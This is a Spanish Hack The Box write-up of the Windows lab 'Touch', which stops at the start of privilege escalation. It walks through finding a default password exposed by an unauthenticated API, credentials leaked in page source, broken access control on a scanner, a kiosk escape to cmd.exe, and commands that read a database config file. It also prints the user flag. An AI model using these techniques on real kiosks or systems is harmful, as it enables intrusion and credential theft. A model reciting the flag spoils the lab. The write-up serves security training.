# HTB Touch — Writeup en español

**Máquina:** Touch, Hack The Box
**Dificultad:** Easy
**Sistema operativo:** Windows
**Nota de continuidad:** en una máquina anterior (Layover) se obtuvo un nombre y un código de reserva (Jenny Crawford / KS7X2M). Ese dato sí ha sido necesario en esta máquina: la aplicación de facturación del kiosco pide el apellido y la referencia de reserva como primer paso del proceso de check-in, antes de llegar a la pantalla de verificación del documento de viaje. HTB suele encadenar pistas de este tipo entre máquinas de una misma temática.

En este writeup cuento cómo he resuelto **Touch**, paso a paso y en el mismo orden en que he ido avanzando. Incluyo tanto las pruebas que funcionaron como los intentos que no llevaron a ninguna parte, porque también forman parte del proceso: ayudan a entender por qué he cambiado de estrategia.

La idea es que se pueda seguir sin conocer de memoria todas las herramientas. Cuando aparece un concepto técnico importante, explico para qué sirve y qué conclusión saqué del resultado.

Para revisar la aplicación web del puerto 8443 utilicé **Burp Suite**. En pocas palabras, Burp permite ver las peticiones que hace el navegador, repetirlas y cambiar detalles como las cookies o las rutas. Esto fue especialmente útil para comprobar qué endpoints pedían iniciar sesión y cuáles respondían sin ella.

---
## 1. Reconocimiento inicial

El primer paso es identificar qué servicios expone la máquina. Para ello se usa Nmap, la herramienta estándar de escaneo de puertos.

```
nmap -sC -sV 10.129.160.249
```

El parámetro `-sV` intenta identificar la versión del software en cada puerto; `-sC` ejecuta un conjunto de scripts básicos de reconocimiento. El resultado es el siguiente:

```
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  -> redirige a /login
```

![Resultado del escaneo nmap -sC -sV](images/img-000.png)

De los cuatro puertos, el 135 (RPC) y el 3389 (RDP, Escritorio Remoto de Windows) son servicios habituales de cualquier máquina Windows. El 5985 corresponde a WinRM, el mecanismo de administración remota de Windows mediante PowerShell. El puerto 8443 aloja una aplicación web propia que redirige a `/login`: es el único de los cuatro que no es un servicio genérico de Windows, por lo que concentra el interés del análisis.

Un escaneo de todos los puertos TCP (`-p- --min-rate 1000`, para acelerar el barrido completo) confirma que no hay ningún otro puerto abierto:

```
135/tcp  open  msrpc
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8443/tcp open  https-alt
```

![Resultado del escaneo completo de puertos](images/img-001.png)

Un escaneo dirigido al puerto 8443 con los scripts `http-title` y `http-headers` muestra las cabeceras de la respuesta:

```
Location: /login
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
```

![Cabeceras HTTP del puerto 8443](images/img-002.png)

La cabecera `Access-Control-Allow-Origin: *` corresponde a CORS (Cross-Origin Resource Sharing) y permite que páginas de cualquier origen hagan peticiones a esta API. No constituye una vulnerabilidad por sí sola, pero suele indicar que la API está pensada para ser consumida por otra aplicación, algo que se confirma más adelante.

El script `http-enum`, que prueba rutas comunes como `/admin` o `/backup`, no encuentra nada adicional:

```
nmap -p8443 --script http-enum 10.129.160.249
```

![Resultado de http-enum sobre el puerto 8443](images/img-003.png)

Un intento posterior de comprobar el certificado TLS del puerto 8443 con `--script ssl-cert,ssl-enum-ciphers` tampoco aporta información, ya que el servicio no utiliza TLS pese a correr sobre un puerto que convencionalmente se asocia a HTTPS. Varios intentos de conexión con `curl` fallan con el mismo error de negociación TLS, confirmando que el puerto 8443 habla HTTP plano y no HTTPS.

---
## 2. Enumeración del panel de login

Se visita `http://10.129.160.249:8443/login` con el navegador configurado para enrutar el tráfico a través de Burp Suite (Proxy → Intercept). La página corresponde a un panel llamado **Nexion DeviceHub**.

![Pantalla de login: cabecera «Nexion DocReader», subtítulo «DeviceHub DH-100 — Gate B7», campo de contraseña y los botones «Sign In» y «Scan Staff Badge»](images/img-004.png)

Con Burp capturando las peticiones, se prueba un primer intento de login con la contraseña `admin`, y se observa también el botón de autenticación por tarjeta ("Scan Badge"). Las peticiones capturadas en Proxy → HTTP history son:

```
GET  /login            → 200
POST /login             → intento con "admin", respuesta de contraseña inválida
POST /login/badge       → {"success":false,"error":"No badge detected"}
```

![Historial de Proxy → HTTP history: dos GET y dos POST a /login seguidos del POST a /login/badge, con la hora exacta de cada petición](images/img-005.png)

![La misma secuencia vista en la tabla completa de HTTP history, con el código de estado 200 y el título de página «Nexion DeviceHub - Login» ya visible en la primera petición GET](images/img-006.png)

La información recopilada identifica la aplicación web como Nexion DeviceHub y registra las primeras interacciones con sus endpoints. Durante las pruebas se realizan solicitudes `GET` y `POST` a `/login`, además de una petición `POST` a `/login/badge`. Este registro sirve como referencia para continuar investigando el proceso de autenticación y los recursos expuestos por la aplicación.

![Respuesta a POST /login con `password=admin`: en el HTML aparece el `<div class="login-hint">` con la pista del serial en el atributo `title`, y la función `scanBadge()` que dispara `POST /login/badge`](images/img-009.png)

En Burp Suite se inspecciona la petición `POST` enviada a `/login` y la respuesta del servidor. En el código de la página aparece una pista sobre la contraseña predeterminada, que corresponde al número de serie del dispositivo. También se observa la función JavaScript `scanBadge()`, que envía una petición `POST` a `/login/badge` para iniciar la lectura de una tarjeta. Estos elementos permiten identificar dos vías de autenticación que merece la pena investigar.

![Menú contextual de Burp: "Send to Repeater" resaltado sobre la petición POST /login/badge](images/img-007.png)

Selecciono la petición `POST /login/badge` en Burp Suite y la envío a Repeater para revisarla con más detalle y comprobar cómo responde la aplicación al intentar utilizar el sistema de autenticación mediante tarjeta.

![Repeater: respuesta a POST /login/badge — 200 OK con el cuerpo `{"success":false,"error":"No badge detected"}`](images/img-008.png)

Una vez enviada la petición `POST /login/badge` desde Repeater, la aplicación responde con un código `200 OK`, pero indica que no se ha detectado ninguna tarjeta (`"No badge detected"`). Esto muestra que el endpoint está respondiendo correctamente a la petición HTTP, aunque el intento de autenticación mediante tarjeta no se completa.

El HTML de la respuesta a `GET /login` contiene una pista explícita:

> *"The default password is the device serial number included in your DeviceHub packaging."*

Es decir, la contraseña por defecto del panel es el número de serie del dispositivo físico. Este es un patrón de diseño habitual en sistemas IoT (routers, cámaras, impresoras de red), en los que se usa un identificador del propio hardware como contraseña inicial, asumiendo que un atacante remoto no podría conocerlo. A partir de aquí, el objetivo pasa a ser localizar ese número de serie en algún otro punto de la aplicación.

El formulario de login solo pide contraseña, sin campo de usuario. El botón "Scan Badge" ejecuta en el navegador la llamada `fetch('/login/badge',{method:'POST'})`, que no envía ningún parámetro: simplemente le pide al servidor que compruebe si hay una tarjeta física en el lector. Al no disponer de ese lector, esta vía queda descartada por el momento.

Revisando en Burp el cuerpo completo de la respuesta a `GET /login`, se confirma que no se carga ningún archivo JavaScript externo: todo el código está incluido directamente en la página, y las únicas rutas que aparecen en ese código son:

```
POST /login
POST /login/badge
GET  /favicon.svg
GET  /css/style.css
```

![El mismo fragmento HTML (pista del serial y `scanBadge()`), observado ahora directamente sobre el GET /login original, sin el intento previo con `password=admin`: confirma que la pista está presente desde la carga inicial de la página](images/img-010.png)

El mapa del sitio y el historial de Burp también registran las rutas públicas observadas durante esta fase; las siguientes tres capturas son del reconocimiento inicial, antes de autenticarse.

![Site map de Burp en este punto: árbol con `css`, `favicon.svg`, `login` (con el nodo `POST password=`) y `login/badge`, junto al detalle de GET /login confirmando el `<title>Nexion DeviceHub - Login</title>`](images/img-033.png)

![El mismo historial de HTTP history ya mostrado en la figura anterior (img-006), aquí como parte del registro cronológico de peticiones previas a la autenticación](images/img-034.png)

![Vista recortada del site map (árbol + tabla, sin los paneles de petición/respuesta): mismo contenido que img-033, en un encuadre más compacto](images/img-035.png)

Esta vista de Burp sirve como registro de las rutas y peticiones observadas hasta el momento. Ayuda a no repetir pruebas y a distinguir lo que se ha visto antes y después de autenticarse.

### 2.1 Comprobación de métodos HTTP y descubrimiento del CSS completo

Se consulta primero la salida de Nmap para los métodos y cabeceras HTTP. Después se prueban `OPTIONS /` y `OPTIONS /login` en Burp Repeater; ambas peticiones devuelven `204 No Content`. Por último, se solicita `GET /css/style.css`, un recurso que el navegador carga automáticamente y que rara vez se revisa a mano.

![Salida combinada de tres escaneos de Nmap: `http-headers`/`http-methods` y `http-enum` contra el puerto 5985 (sin hallazgos adicionales) y el mismo conjunto de scripts contra el 8443, donde `http-methods` confirma los verbos soportados (`GET, HEAD, POST, OPTIONS`) y `http-headers` repite la política CORS ya vista](images/img-011.png)

![OPTIONS / en Burp Repeater: 204 No Content con la misma cabecera CORS (`Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS`)](images/img-012.png)

![OPTIONS /login en Burp Repeater: mismo resultado, 204 No Content](images/img-013.png)

![Cuerpo completo de `/css/style.css` (3494 bytes): clases `sidebar`, `topbar`, `cards`, `info-table`, `badge--online`/`offline` y botones `btn--success`/`danger` visibles en el CSS](images/img-014.png)

La respuesta es un `200 OK` con la hoja de estilos de toda la aplicación, no solo del login. Dentro aparecen clases como `sidebar`, `sidebar__nav`, `topbar`, `cards`, `info-table`, `log-box`, botones `success`/`danger` y estados `online`/`offline`. Esto confirma que existe un panel de administración completo detrás del login, aunque todavía no sea accesible: el CSS no contiene datos sensibles, pero revela la estructura de la interfaz oculta.

### 2.2 Descubrimiento de la API

A partir de la estructura revelada por el CSS, se prueban en Burp Repeater varios archivos y rutas candidatas. Las solicitudes a `/robots.txt`, `/sitemap.xml`, `/manifest.json`, `/dashboard`, `/device`, `/devices` y `/logs` redirigen a `/login`, lo que es compatible con una comprobación de sesión. Las capturas muestran las solicitudes concretas, todas con el mismo patrón (`302 Found`, `Location: /login`):

![GET /robots.txt → 302 Found, Location: /login](images/img-015.png)

![GET /sitemap.xml → 302 Found, Location: /login](images/img-016.png)

![GET /manifest.json → 302 Found, Location: /login](images/img-017.png)

![GET /dashboard → 302 Found, Location: /login](images/img-018.png)

![GET /device → 302 Found, Location: /login](images/img-019.png)

![GET /devices → 302 Found, Location: /login](images/img-020.png)

![GET /logs → 302 Found, Location: /login](images/img-021.png)

Una redirección a `/login` indica que no se puede consultar esa página de forma directa en este momento; por sí sola no demuestra que la ruta no exista.

La ruta `/api` se comporta de forma distinta:

```
GET /api

HTTP/1.1 403 Forbidden
Content-Type: application/json
{"error":"Authentication required"}
```

![GET /api → 403 Forbidden, `{"error":"Authentication required"}`](images/img-022.png)

![GET /api/ (con barra final) → mismo 403 Forbidden y mensaje de error](images/img-023.png)

Se amplía la comprobación con rutas de API y archivos JavaScript relacionados. `/api/login`, `/api/device`, `/api/devices`, `/api/config`, `/api/logs`, `/js/app.js` y `/js/main.js` devuelven redirecciones a `/login`, no un 403; estas pruebas no revelan datos adicionales.

![GET /api/login → 302 Found, Location: /login (a diferencia de /api y /api/, no devuelve 403)](images/img-024.png)

![GET /api/device → 302 Found, Location: /login](images/img-025.png)

![GET /api/devices → 302 Found, Location: /login](images/img-026.png)

![GET /api/config → 302 Found, Location: /login](images/img-027.png)

![GET /api/logs → 302 Found, Location: /login](images/img-029.png)

![GET /js/app.js → 302 Found, Location: /login](images/img-030.png)

![GET /js/main.js → 302 Found, Location: /login](images/img-031.png)

Un `403` es distinto de una redirección, pero por sí solo no demuestra que exista un mecanismo de autenticación independiente ni que `/api` use una arquitectura distinta. Lo que sí permite afirmar es que `/api` y `/api/` reciben un tratamiento diferente al resto de subrutas de la API probadas, y que merece la pena seguir enumerando endpoints relacionados.

### 2.3 Localización del número de serie sin autenticación

Continuando la enumeración, se localiza `GET /api/status`, que devuelve información técnica del dispositivo sin incluir una cookie de sesión:

```
Device:   Nexion DeviceHub DH-100
Serial:   NX-DH-2024-B7042
Firmware: 1.4.2
Status:   online
```

![GET /api/status sin cookie → 200 OK con el JSON completo: `device`, `serial: NX-DH-2024-B7042`, `firmware: 1.4.2`, `status: online` y `uptime: 13968`](images/img-028.png)

Este hallazgo completa la pista del login: la página indicaba que la contraseña por defecto es el número de serie, y `/api/status` lo expone sin autenticación. Se prueba `NX-DH-2024-B7042` como contraseña del panel.
## 3. Acceso al panel DeviceHub

El login con el serial se realiza desde el navegador (con Burp interceptando la petición) y resulta exitoso:

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: nxsession=...
```

![POST /login con el serial como contraseña: 302 Found y Set-Cookie nxsession](images/img-032.png)

El código `302` indica una redirección correcta tras el login, y la respuesta incluye una cookie de sesión (`nxsession`) que el navegador enviará en cada petición posterior para mantener la autenticación. A partir de este punto, todas las peticiones autenticadas se repiten en Burp Repeater añadiendo la cabecera `Cookie: nxsession=...` capturada.

El dashboard muestra dos dispositivos periféricos adicionales:

```
Passport Scanner — Nexion DocReader SR-4200, serial NX-SR-2024-0042
Boarding Pass Printer — Nexion TP-820, serial NX-TP-2024-0042
```

y confirma las rutas del panel: `/dashboard`, `/scanner`, `/printer`, `/logs`, `/settings`, `/logout`. El panel se identifica como "Gate B7, Kiosk #042", lo que confirma que administra el hardware de un kiosco de facturación de aeropuerto.

![Dashboard con los dos dispositivos periféricos listados](images/img-036.png)

### 3.1 La página `/settings` filtra los endpoints de la API

Con la cookie de sesión añadida en Burp Repeater, se solicita `GET /settings`. La página no muestra contraseñas nuevas, pero su código JavaScript embebido revela los endpoints reales que la API acepta:

```
POST   /api/scan
PUT    /api/scanner/settings
POST   /api/scanner/test-image
DELETE /api/scanner/test-image
PUT    /api/printer/settings
```

![Respuesta de /settings con el script embebido](images/img-037.png)

Este tipo de filtración es habitual: el JavaScript que se descarga al navegador para dar funcionalidad a los botones de la interfaz contiene, sin pretenderlo, el mapa completo de la API, incluidas rutas que el usuario nunca llega a pulsar.

### 3.2 La página `/scanner` filtra credenciales embebidas

Siguiendo el mismo procedimiento con `GET /scanner`, aparecen credenciales ocultas tras puntos en la interfaz pero visibles en el código fuente HTML:

```
Usuario:   KioskUser
Password:  K!0sk2026#
```

![Interfaz /scanner con los campos de usuario y contraseña enmascarados y controles del dispositivo](images/img-038.png)

Se trata de un fallo conocido como secretos incrustados en el cliente (hardcoded secrets): una credencial que debería permanecer en el servidor acaba viajando al navegador porque se incluyó en el HTML o el JavaScript en lugar de mantenerla en el backend. La página también lista endpoints de administración del hardware (`power`, `calibrate`, `test-image`, entre otros). El más relevante es `POST /api/scanner/test-image`, que según el propio código acepta la subida directa de un archivo:

```js
fetch('/api/scanner/test-image', {
    method: 'POST',
    body: input.files[0]
})
```

Cualquier endpoint que reciba archivos sin más validación es, por naturaleza, una superficie de ataque a revisar.

## 4. Fallo de control de acceso en la API del escáner

Con la sesión autenticada todavía activa, se prueba primero la acción "Test Scan" de la interfaz de `/scanner`, que dispara internamente `POST /api/scan`: en ese momento no hay ningún documento sobre el cristal del escáner, y la API lo refleja con `documentDetected:false`.

![POST /api/scan autenticado (con la cookie `nxsession`): 200 OK, `"success":true,"documentDetected":false,"message":"No document detected on scanner glass"`](images/img-039.png)

A continuación, desde la misma interfaz, se envía una petición `POST /api/scanner/test-image` sin ningún archivo adjunto, repetida también en Burp Repeater; el servidor responde `400 Bad Request` indicando que el tamaño de la imagen debe estar entre 100 bytes y 10 MB, lo que confirma que el endpoint valida al menos el tamaño del contenido recibido.

![POST /api/scanner/test-image con `Content-Length: 0` y `Content-Type: image/jpeg`: 400 Bad Request, `{"error":"Image must be between 100 bytes and 10MB"}`](images/img-040.png)

A continuación se sube, desde el botón de la interfaz, una imagen de prueba real. El servidor la almacena y la devuelve en `/api/scanner/test-image/preview`.

Para inspeccionar la respuesta, se selecciona `GET /api/scanner/test-image/preview` en el historial de Burp y se envía a Repeater. Allí se observa una inconsistencia: la cabecera declara `Content-Type: image/jpeg`, pero el cuerpo comienza con la firma de un archivo PNG (`89 50 4E 47`). El tamaño de la respuesta es de 15872 bytes.

![Envío de GET /api/scanner/test-image/preview al historial de Burp hacia Repeater, desde el menú contextual](images/img-041.png)

![Respuesta de preview: `Content-Type: image/jpeg`, `Content-Length: 15872`, cuerpo con firma PNG (`‰PNG` + chunk `IHDR`)](images/img-042.png)

Se comprueba también `GET /api/scan/last-capture`, que devuelve el mismo tamaño (15872 bytes) y el mismo tipo de contenido declarado, confirmando que la acción "Test Scan" de la interfaz reutiliza la imagen subida como última captura. El desajuste entre el tipo declarado y el contenido real es un indicio de validación débil, aunque no resulta explotable por sí solo en este punto.

### 4.1 Comprobación del control de acceso sin cookie de sesión

La prueba habitual para detectar fallos de control de acceso consiste en repetir cada petición autenticada eliminando la cookie de sesión y comprobar si el servidor la sigue aceptando. Desde Burp Repeater, se elimina la cabecera `Cookie` y se repiten las dos peticiones anteriores:

```
GET /api/scan/last-capture HTTP/1.1
Host: 10.129.160.249:8443
Connection: close
```

```
GET /api/scanner/test-image/preview HTTP/1.1
Host: 10.129.160.249:8443
Connection: close
```

![GET /api/scan/last-capture sin cookie: 200 OK, mismo cuerpo PNG de 15872 bytes que con sesión](images/img-043.png)

![GET /api/scanner/test-image/preview sin cookie: 302 Found, `Location: /login`](images/img-044.png)

| Endpoint                              | Sin cookie      | Con cookie      |
| ------------------------------------- | --------------- | --------------- |
| `GET /api/scan/last-capture`          | 200 OK + imagen | 200 OK + imagen |
| `GET /api/scanner/test-image/preview` | 302 → `/login`  | 200 OK + imagen |
El resultado muestra que `/api/scan/last-capture` responde igual con o sin sesión, mientras que su endpoint equivalente, `/api/scanner/test-image/preview`, sí exige autenticación.

### 4.2 Confirmación de que también se puede ejecutar una acción sin autenticación

No basta con comprobar la lectura de datos sin autenticar: se prueba también si es posible provocar una acción sobre el dispositivo. Desde Burp Repeater, sin cookie, se envía:

```
POST /api/scan HTTP/1.1
Host: 10.129.160.249:8443
Content-Length: 0
Connection: close
```

```json
{"success":true,"documentDetected":true,"image":"/api/scan/last-capture","message":"Document detected"}
```

![POST /api/scan sin cookie: 200 OK, `"success":true,"documentDetected":true,"message":"Document detected"`](images/img-045.png)

El servidor acepta la petición y devuelve un resultado positivo sin requerir ninguna credencial. Esto confirma un fallo de control de acceso roto (broken access control), una de las categorías de vulnerabilidad más comunes en aplicaciones web, situada en el primer puesto del listado OWASP Top 10. En resumen: cualquiera puede ordenar al escáner físico que capture un documento y posteriormente descargar la imagen resultante, sin necesidad de contraseña.

Se verifica, además, que el resto de acciones del hardware sí están correctamente protegidas. Repitiendo sin cookie `POST /api/scanner/test-image` se obtiene de nuevo una redirección a `/login`:

![POST /api/scanner/test-image sin cookie: 302 Found, `Location: /login`](images/img-046.png)

Lo mismo ocurre con `POST /api/scanner/power`:

![POST /api/scanner/power sin cookie: 302 Found, `Location: /login`](images/img-047.png)

| Endpoint                              | Sin sesión                                  |
| ------------------------------------- | ------------------------------------------- |
| `GET /api/status`                     | accesible (solo expone info de dispositivo) |
| `POST /api/scan`                      | accesible sin autenticación                 |
| `GET /api/scan/last-capture`          | accesible sin autenticación                 |
| `GET /api/scanner/test-image/preview` | protegido                                   |
| `POST /api/scanner/test-image`        | protegido                                   |
| `POST /api/scanner/power`             | protegido                                   |
Por último, se revisa de nuevo `GET /api/status`, que también responde sin autenticación, pero únicamente expone datos de identificación del dispositivo (modelo, firmware, serial, tiempo de actividad), sin aportar información adicional de interés.

![GET /api/status sin cookie: 200 OK, mismo JSON de dispositivo (`serial: NX-DH-2024-B7042`), ahora con `uptime: 16328`](images/img-048.png)

El fallo de control de acceso queda, por tanto, acotado a dos endpoints concretos (`POST /api/scan` y `GET /api/scan/last-capture`), no generalizado a toda la API: el resto de rutas revisadas desde Target → Site map y Proxy → HTTP history en Burp sí exige la cookie de sesión.

### 4.3 Comprobación de rutas relacionadas con el lector de tarjetas

La pantalla de login ofrecía una alternativa de acceso mediante "Staff Badge" (`/login/badge`), y el kiosco de facturación incluye una opción equivalente de "Scan Badge". Se explora si el DeviceHub expone algún endpoint similar bajo `/api`, que pudiera conectar ambos flujos. Desde Burp Repeater se prueban, sin cookie de sesión, tres rutas candidatas:

```
GET /api/badge           HTTP/1.1
GET /api/scanner/badge   HTTP/1.1
GET /api/scan/badge      HTTP/1.1
```

Solo `/api/badge` da una respuesta distinta de un simple "no encontrado": devuelve `302 Found` con `Location: /login`, el mismo comportamiento que las rutas protegidas por sesión. Las otras dos no corresponden a ningún endpoint real.

```
GET /api/badge HTTP/1.1
Host: 10.129.160.249:8443
Connection: close
  
HTTP/1.1 302 Found
Location: /login
```

Se plantea repetir la misma petición añadiendo la cookie de sesión válida, para ver qué devuelve `/api/badge` una vez autenticado. Esa comprobación concreta queda pendiente: el análisis se desvía hacia la prueba de las credenciales filtradas contra RDP y WinRM, que parece una vía más directa hacia el sistema operativo, y la ruta `/api/badge` autenticada no se llega a revisar.

---
## 5. Pivote hacia el kiosco de facturación

En el propio panel aparece un enlace: "Return to Kiosk", apuntando a `http://localhost:5173`. Esto indica que el DeviceHub del puerto 8443 es únicamente el panel de administración del hardware, y que la aplicación real de cara al pasajero corre en otro puerto, accesible solo desde dentro de la propia máquina.

Se intenta acceder a `http://10.129.160.249:5173` desde fuera y la conexión no responde, confirmando que ese servicio no está expuesto externamente.

### 5.1 Comprobación de las credenciales del escáner contra WinRM

Se comprueba si `KioskUser / K!0sk2026#` (las credenciales filtradas en `/scanner`) permiten acceso al sistema operativo, no solo al panel web. Primero se verifica que el puerto esté realmente accesible:

```
Test-NetConnection -ComputerName 10.129.160.249 -Port 5985
TcpTestSucceeded : True
```

Con el puerto confirmado, se intenta autenticar con `Test-WSMan` usando el mecanismo `Negotiate`, que falla con el código de error `0x8009030e`. Ese error puede deberse tanto a credenciales incorrectas como a un problema del propio mecanismo de autenticación, así que no permite descartar las credenciales por sí solo.

![Una misma sesión de PowerShell encadena los tres pasos: `Test-NetConnection` confirma el puerto 5985 abierto (`TcpTestSucceeded: True`), `Get-Credential` solicita la contraseña de `KioskUser`, y `Test-WSMan -Authentication Negotiate` falla con el código `0x8009030e` ("Esto suele ocurrir cuando las credenciales proporcionadas no son válidas en el servidor de destino...")](images/img-049.png)

A continuación se prueba el mecanismo `Basic`:

```
Test-WSMan 10.129.160.249 -Authentication Basic -Credential $cred
```

![Intento con `-Authentication Basic`: el cliente WinRM lo rechaza de inmediato ("El tráfico sin cifrar está deshabilitado en la configuración de cliente. Cambie la configuración de cliente e intente la solicitud de nuevo")](images/img-050.png)

El cliente WinRM lo rechaza de entrada porque, por configuración por defecto, no permite tráfico sin cifrar. Se habilita explícitamente desde una consola de PowerShell con privilegios de administrador:

```
Set-Item WSMan:\localhost\Client\AllowUnencrypted -Value $true
Get-Item WSMan:\localhost\Client\AllowUnencrypted
```

Al ejecutar el primer comando, PowerShell solicita permiso para iniciar el servicio WinRM local (necesario para aplicar el cambio), y la comprobación posterior confirma el valor `True`. Se repite entonces `Enter-PSSession` con `-Authentication Basic`, y el servidor remoto responde con un nuevo error: indica que, al no usarse Kerberos ni estar el equipo unido a un dominio, hay que añadir la IP de destino a la lista de hosts de confianza del cliente (`TrustedHosts`).

```
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.129.160.249" -Force
Get-Item WSMan:\localhost\Client\TrustedHosts
```

Con el host ya añadido a `TrustedHosts`, se repite de nuevo la conexión con `-Authentication Basic`. Esta vez el servidor remoto responde con un error distinto: indica expresamente que el mecanismo de autenticación `Basic` no está habilitado en su configuración, y que el único mecanismo que admite es `Negotiate`. Se vuelve entonces a probar `Negotiate`, ya con `TrustedHosts` configurado, y la autenticación sigue sin completarse: las credenciales del escáner no son válidas para iniciar sesión por WinRM bajo ningún mecanismo probado.

### 5.2 Acceso por RDP

Las mismas credenciales se prueban contra el puerto 3389 mediante el cliente de Escritorio Remoto de Windows:

```
mstsc /v:10.129.160.249
```

![Pantalla de login de RDP: icono de usuario genérico sobre el nombre de cuenta "Airport Kiosk" y un campo de contraseña](images/img-051.png)

![Selector de cuentas de Windows con dos perfiles disponibles: "Airport Kiosk" y "Administrator"](images/img-052.png)

![Sesión RDP ya establecida: la aplicación arranca directamente en pantalla completa mostrando "SELF CHECK-IN / Touch screen to begin", sin barra de tareas ni escritorio visible](images/img-053.png)

El acceso por RDP sí funciona, pero la sesión no muestra un escritorio de Windows convencional: lanza directamente una aplicación de kiosco a pantalla completa (el software de facturación), sin acceso a la barra de tareas. Este comportamiento corresponde a un modo kiosco configurado en Windows, en el que el inicio de sesión con un usuario concreto lanza automáticamente una única aplicación bloqueada. En la pantalla de selección de cuentas se observa que también existe una cuenta `Administrator` en el sistema, inalcanzable mientras la sesión permanezca encerrada en el kiosco.

Se intenta especificar directamente el usuario en la línea de comandos de `mstsc` (`mstsc /v:10.129.160.249 .\Airport Kiosk`), pero el cliente de Escritorio Remoto no acepta el nombre de usuario de esa forma: la ventana se abre sin aplicar ninguna credencial. Se prueba entonces forzar el cuadro de credenciales con `mstsc /v:10.129.160.249 /prompt`, con intención de usar la opción "Usar otra cuenta" para introducir manualmente `.\Administrator`, pero esa opción no aparece disponible en la pantalla de login del RDP: la sesión siempre se inicia de forma automática con la cuenta `Airport Kiosk` y lanza directamente la aplicación de kiosco. Desde dentro de la sesión, la combinación `Ctrl+Alt+End` (el equivalente remoto de `Ctrl+Alt+Supr`) tampoco produce ninguna reacción visible. Se comprueba además, desde la propia máquina atacante, el listado de credenciales almacenadas (`cmdkey /list`) y se intenta `mstsc /v:10.129.160.249 /admin` para forzar una sesión administrativa distinta; ninguna de las dos vías consigue abrir una sesión diferente de la del kiosco. Se descarta por tanto cualquier intento de cambiar de cuenta dentro de la propia sesión RDP y se concentra el análisis en el software del kiosco en sí.

---
## 6. Escape del modo kiosco

Con control administrativo sobre el hardware del escáner desde el panel de las 8443, se decide usar ese control para provocar deliberadamente un error en la aplicación de kiosco: desde el panel DeviceHub se apaga el escáner (`POST /api/scanner/power`, autenticado con la cookie de sesión del panel).

![Ficha «Device Information» del escáner tras apagarlo: `Status: OFFLINE`, el botón pasa a «Power On» y «Calibrate»/«Test Scan» quedan deshabilitados; `Scan Count` se mantiene en 24904](images/img-054.png)

![Aviso de «Machine Information» del propio kiosco: "In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M"](images/img-055.png)

A continuación, dentro de la sesión RDP, se retoma la aplicación de kiosco desde el principio del proceso de check-in: se introduce el apellido y la referencia de reserva obtenidos en la máquina Layover (Jenny Crawford / KS7X2M), lo que permite avanzar a la siguiente pestaña del asistente, la de verificación del documento de viaje. Esa pestaña intenta escanear automáticamente el pasaporte o la tarjeta de embarque a través del mismo escáner físico que acaba de apagarse desde el DeviceHub.

![Formulario «BUSCAR SU RESERVA» (HTB Airways, T4 · Gate B7 · #042): pestaña «REF. RESERVA» con `KS7X2M` en el campo de referencia y `CRAWFORD` en apellido, lista para pulsar «BUSCAR RESERVA»](images/img-056.png)

![Pestaña «VERIFICACIÓN DE DOCUMENTO» para el vuelo KS402 (HTB → LHR): recuadro de escaneo con el mensaje "PLACE PASSPORT FACE DOWN" y el botón «SCAN PASSPORT», antes de que el escáner responda](images/img-057.png)

El fallo de dispositivo abre una ventana de error con un enlace de soporte. El flujo observado a partir de ahí es el siguiente:

```
Apellido + referencia de reserva introducidos en el kiosco
      ↓
Avance a la pestaña de verificación del documento de viaje
      ↓
Esa pestaña intenta escanear el documento (escáner ya apagado)
      ↓
El backend recibe un error de dispositivo
      ↓
El mensaje de error incluye un enlace
      ↓
El enlace abre un navegador fuera del kiosco
      ↓
Ctrl+O abre el selector de archivos de Windows
      ↓
Desde el selector, se navega hasta C:\Windows\System32 y se localiza cmd.exe
      ↓
Se ejecuta cmd.exe desde el propio selector de archivos
      ↓
Consola de comandos funcional con el usuario KioskUser
```

![Cuadro «Nexion DocReader SR-4200 - Error»: "ha dejado de responder", `Error Code: SCN-ERR-4092`, dispositivo `NX-SR-2024-0042`, con el enlace `https://support.nexionsystems.com/docreader/troubleshoot`](images/img-058.png)

![El enlace abre un navegador dentro de la propia sesión RDP; la página de `support.nexionsystems.com` falla con `DNS_PROBE_FINISHED_NO_INTERNET`, y desde ahí `Ctrl+O` abre el selector de archivos de Windows, ya con `cmd.exe` localizado entre los resultados de búsqueda en `System32`](images/img-059.png)

La consola confirma que se ha salido de la interfaz limitada del kiosco. El resultado de `whoami` identifica la cuenta actual; todavía no significa que se tengan privilegios de administrador.

![Consola `cmd.exe` recién abierta: `whoami` devuelve `kiosk-042\kioskuser`; la línea siguiente parece un pegado accidental de esa misma salida interpretada como comando, resuelto con un error de DNS ajeno a la intrusión](images/img-060.png)

Desde la consola obtenida al escapar de la aplicación de kiosco, se accede al escritorio de `KioskUser` y se comprueba el contenido de `user.txt`. La lectura del archivo permite recuperar la flag de usuario de la máquina.

![Desde `C:\Users\KioskUser\Desktop`, `dir` lista (entre varios errores de «message file» propios de este entorno) un `user.txt` de 34 bytes fechado el 07/10/2026; `type user.txt` devuelve la flag](images/img-061.png)

**Flag user:** `315f8dd7580302fcdddd616fa6ebbddc`

Esta técnica aprovecha un fallo habitual en aplicaciones de kiosco: cualquier ventana secundaria que el software no haya bloqueado explícitamente (un cuadro de diálogo de error con un enlace, un selector de archivos) puede convertirse en la vía de escape hacia el sistema operativo completo, dado que la aplicación de pantalla completa sigue ejecutándose sobre un Windows funcional por debajo.

---
## 7. Escalada de privilegios: de KioskUser a SYSTEM vía MySQL

Con una consola funcional como `KioskUser`, se procede a la enumeración local del sistema.

![`whoami /priv` (recortado) y `whoami /groups`: destaca el grupo local `KIOSK-042\Printer Administrators`, además de los grupos habituales de sesión interactiva; el intento posterior `wmic service get name,startname,state,pathname` falla con un error de resolución DNS propio de este entorno](images/img-066.png)

Se parte de la carpeta de configuración propia de la aplicación de la aerolínea:

```
dir "C:\ProgramData\HTB Airways" /s /b
type "C:\ProgramData\HTB Airways\db-config.ini"
```

